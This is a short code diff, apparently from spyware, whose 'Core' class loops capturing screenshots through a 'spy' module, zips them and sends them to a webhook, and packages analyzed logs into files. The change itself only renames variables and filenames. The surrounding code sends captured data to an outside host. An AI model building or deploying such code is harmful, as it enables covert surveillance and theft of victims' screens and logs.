@@ -54,12 +54,12 @@ class Core:
         """Função de envio das capturas de tela"""
         while True:
             try:
-                zip_path = self.spy.main(
+                zip_imgs_path = self.spy.main(
                     duration=interval, interval_seconds=interval_seconds)
                 self.webhook.send_file(
-                    zip_path, "\n📸 Screenshots obtidas:"
+                    zip_imgs_path, "\n📸 Screenshots obtidas:"
                 )
-                os.remove(zip_path)
+                os.remove(zip_imgs_path)
             except Exception as e:
                 print(f"[Spy Error] {e}")
 
@@ -84,9 +84,9 @@ class Core:
                 analysis_text = analyze_logs(logs)
                 pdf_content = convert_pdf(analysis_text)
 
-                analysis_txt_filename = f"analyzed_log{timestamp}.txt"
-                analysis_pdf_filename = f"analyzed_log{timestamp}.pdf"
-                package_zip_filename = f"AI_analyzed_data{timestamp}.zip"
+                analysis_txt_filename = f"analyzed_log_{timestamp}.txt"
+                analysis_pdf_filename = f"analyzed_log_{timestamp}.pdf"
+                package_zip_filename = f"AI_analyzed_data_{timestamp}.zip"
 
                 files_for_package = {
                     analysis_txt_filename: analysis_text,
